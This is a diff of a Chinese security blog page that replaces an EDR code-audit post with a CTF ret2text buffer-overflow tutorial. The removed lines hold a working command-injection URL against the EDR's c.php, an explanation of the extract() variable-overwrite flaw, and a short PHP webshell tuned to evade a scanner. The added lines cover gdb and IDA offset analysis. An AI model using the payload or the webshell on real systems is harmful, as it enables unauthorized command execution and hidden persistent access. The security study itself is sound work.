@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="YLL">
   <meta name="keywords" content="">
-  <title>某X服EDR审计 - YLL-F11</title>
+  <title>pwn之ret2text - YLL-F11</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -160,8 +160,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-08-31 17:38" pubdate>
-      2020年8月31日 下午
+    <time datetime="2020-09-10 11:02" pubdate>
+      2020年9月10日 上午
     </time>
   </div>
 
@@ -171,7 +171,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      422 字
+      350 字
     </span>
   
 
@@ -181,7 +181,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      3
        分钟
     </span>
   
@@ -211,35 +211,19 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">某X服EDR审计</h1>
+            <h1 style="display: none">pwn之ret2text</h1>
             
             <div class="markdown-body" id="post-body">
-              <h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。 </p>
-<ul>
-<li>据网上公开的paylaod显示，该漏洞利用方式难度较低。</li>
+              <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>题目下载<a target="_blank" rel="noopener" href="https://github.com/YLL-F1/pwn/raw/master/ret2text">下载地址</a></p>
+<h3 id="web狗的转型之路"><a href="#web狗的转型之路" class="headerlink" title="web狗的转型之路"></a>web狗的转型之路</h3><p>before long history。。。。。。之前，一直在web层的安全进行专研，偶然一次接触pwn题，感觉在安全路上又找到了一个新的起点。接下来也会慢慢步入pwn中，了解二进制中的安全。</p>
+<h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul>
+<li><font color=red>gdb:</font> linux下的动态调试工具。  </li>
+<li><font color=red>ida:</font> 方便windows下静态查看的反编译工具。  </li>
 </ul>
-<p><code>https://x.x.x.x/tool/log/c.php?strip_slashes=system&amp;host=id</code>  </p>
-<p><img src="/images/edr/1.png" srcset="/img/loading.gif">  </p>
-<h2 id="原代码分析"><a href="#原代码分析" class="headerlink" title="原代码分析"></a>原代码分析</h2><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>应为这个漏洞点源自于php中的变量覆盖，也就是自定义的参数值替换原有变量值的情况，也称为变量覆盖漏洞。</p>
-<pre><code class="hljs aidl">&lt;?php
-$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1
-extract(array(&#39;a&#39; &#x3D;&gt; &#39;3&#39;));&#x2F;&#x2F;经过extract()函数对$b处理后
-echo $a;    &#x2F;&#x2F;输出结果为3
-?&gt;</code></pre>
-
-<h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p>根据payload分析，该漏洞点定存在于c.php代码中，首先先看下show_form函数。不难发现show_form的所接受的参数$params可以被extract函数进行变量覆盖。</p>
-<p><img src="/images/edr/2.png" srcset="/img/loading.gif">  </p>
-<h3 id="可变量输入"><a href="#可变量输入" class="headerlink" title="可变量输入"></a>可变量输入</h3><p>那既然extract可以进行变量覆盖，所以就要寻找show_form($params)所接受的参数是否为可变量，或如何构造可变量。接着往下走$show_form($_REQUEST)这段函数让$params成为可能。<br><img src="/images/edr/3.png" srcset="/img/loading.gif">  </p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>既然已经有了可控变量，那如何构造出所需的payload？$strip_slashes($host)该函数其实已经帮我们完成了构造，直接用即可。在传入所需参数后该函数就变为system(id)，所以只需变host即可。<br><img src="/images/edr/4.png" srcset="/img/loading.gif">  </p>
-<h2 id="免杀webshell"><a href="#免杀webshell" class="headerlink" title="免杀webshell"></a>免杀webshell</h2><p>既然知道了原理，就顺手写一个webshell看看其是否拥有免杀功能。哈哈哈。</p>
-<pre><code class="aidl">&lt;?php    
-function kk($params)&#123;
-    extract($params);
-    $qq($jj);
-&#125;;
-kk($_REQUEST);
-?&gt;</code></pre>
-<p><img src="/images/edr/5.png" srcset="/img/loading.gif"><br>D盾测试，效果还可以。<br><img src="/images/edr/6.png" srcset="/img/loading.gif"> </p>
+<h3 id="题目大概"><a href="#题目大概" class="headerlink" title="题目大概"></a>题目大概</h3><p><img src="/images/ret2text/6.png" srcset="/img/loading.gif"><br>初步运行该文件，发现该文件功能大致为输入，输出。<br><img src="/images/ret2text/1.png" srcset="/img/loading.gif"><br>IDA还原C代码，可以发现主函数使用gets()进行输入，printf()进行输出。 </p>
+<h3 id="概要分析"><a href="#概要分析" class="headerlink" title="概要分析"></a>概要分析</h3><p><img src="/images/ret2text/2.png" srcset="/img/loading.gif"> </p>
+<p><img src="/images/ret2text/5.png" srcset="/img/loading.gif"><br>IDA分析发现的看到两个关键点分别为gets()，system()。正常运行题目文件会在输入参数后跳转到printf()函数，是无法跳转到system函数。所以，我们要利用C语言中的gets()函数存在溢出漏洞，去执行system()函数。</p>
+<h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>ida静态分析，定位到gets()函数地址。F5还原C代码，ida显示s到ebp的偏移为64h，但ida的静态分析可能存在不准确信，所有再用gdb动态进行分析确定。<br>使用GDB在gets()函数地址080486AE下断点 <code>b *0x080486AE</code><br>输入<code>r</code>运行<br><img src="/images/ret2text/3.png" srcset="/img/loading.gif"><br>变量s到EBP的偏移为|0x0ffffcfd8-0xffffcf6c|=0x6C，所以s相对与返回地址的偏移为0x6c+4=0x70，所以ida的偏移量计算还是存在偏差。</p>
 
             </div>
             <hr>
@@ -256,18 +240,12 @@ kk($_REQUEST);
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/10/pwn%E4%B9%8Bret2text/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pwn之ret2text</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/08/11/%E5%9C%9F%E8%B1%86%E7%89%9B%E8%85%A9/">
-                        <span class="hidden-mobile">土豆牛腩</span>
+                      <a href="/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/">
+                        <span class="hidden-mobile">某X服EDR审计</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -429,7 +407,7 @@ kk($_REQUEST);
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "某X服EDR审计&nbsp;",
+        "pwn之ret2text&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
